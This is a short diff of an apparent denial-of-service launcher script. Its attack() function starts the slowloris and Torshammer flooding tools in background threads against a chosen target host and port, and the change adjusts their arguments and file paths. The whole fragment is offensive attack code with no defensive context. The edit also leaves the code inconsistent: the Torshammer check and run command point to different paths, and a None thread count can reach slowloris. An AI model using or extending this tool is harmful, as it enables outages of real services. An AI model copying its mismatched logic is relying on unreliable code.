@@ -38,10 +38,10 @@ def excute(cmd):
 def attack(target, port, thread=None):
     print('[!] Start attack...')
     if os.path.exists('dos-tools/slowloris.py'):
-        t = threading.Thread(target=excute, args=(f'python3 dos-tools/slowloris.py {target} -p {port}&',))
+        t = threading.Thread(target=excute, args=(f'python3 dos-tools/slowloris.py {target} -p {port} -s {thread}&',))
         t.start()
     
-    if os.path.exists('dos-tools/Torshammer1.0/torshammer.py'):
+    if os.path.exists('dos-tools/torshammer1/torshammer.py'):
         if not thread: thread = 100
         t = threading.Thread(target=excute, args=(f'python dos-tools/Torshammer1.0/torshammer.py -t {target} -r {thread}&',))
         t.start()
